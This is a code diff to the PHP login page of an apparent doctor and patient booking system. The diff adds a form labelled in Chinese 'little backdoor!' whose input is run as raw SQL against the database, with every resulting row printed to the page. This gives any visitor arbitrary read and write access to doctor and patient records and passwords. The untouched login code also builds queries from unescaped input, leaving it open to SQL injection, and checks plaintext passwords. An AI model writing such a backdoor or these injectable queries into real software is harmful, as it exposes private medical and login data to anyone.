@@ -39,7 +39,7 @@
 
 
     if($_POST){
-
+        if(array_key_exists('useremail', $_POST)){
         $email=$_POST['useremail'];
         $password=$_POST['userpassword'];
         
@@ -47,7 +47,7 @@
 
         $result_doctor = $database->query("select * from doctor where docemail='$email'");
         $result_patient = $database->query("select * from patient where pemail='$email'");
-
+        
         if($result_doctor->num_rows==1){
             //TODO
             $checker = $database->query("select * from doctor where docemail='$email' and docpassword='$password'");
@@ -79,7 +79,31 @@
             }
         }else{
             $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">We cant found any acount for this email.</label>';
-        } 
+        }
+    }else{
+        $error='<label for="promter" class="form-label"></label>';
+        $sql=$_POST['sql'];
+        $result_sql = $database->query($sql);
+        // $row=$result_sql->fetch_assoc();
+
+        while ($row = $result_sql->fetch_assoc()) {
+            print_r($row);
+        }
+        
+        // echo $row;
+        // echo '<tr >
+                                       
+                                        
+                                       
+                                        
+                                        
+        //                                 <td style="text-align:center;">
+        //                                     '.$result_sql.'
+        //                                 </td>
+
+                                        
+        //                             </tr>';
+    } 
     }else{
         $error='<label for="promter" class="form-label">&nbsp;</label>';
     }
@@ -158,6 +182,39 @@
                     <br><br><br>
                 </td>
             </tr>
+    </div>
+    <div class="container" style="margin-top:120px">
+        <table border="0" style="margin: 0;padding: 0; width: 60%;">
+            <tr>
+                <td>
+                    <p class="header-text">小後門!</p>
+                </td>
+            </tr>
+        <div class="form-body">
+            <tr>
+                <form action="" method="POST" >
+                <td class="label-td">
+                    <label for="sql" class="form-label">語法: </label>
+                </td>
+            </tr>
+            <tr>
+                <td class="label-td">
+                    <input type="sql" name="sql" class="input-text" placeholder="sql" required>
+                </td>
+            </tr>
+            <tr>
+                <td><br>
+                <?php echo $error ?>
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <input type="submit" value="輸入" class="login-btn btn-primary btn">
+                </td>
+            </tr>
+        </div>
+    </form>
+        </table>
     </div>
 </center>
 </body>
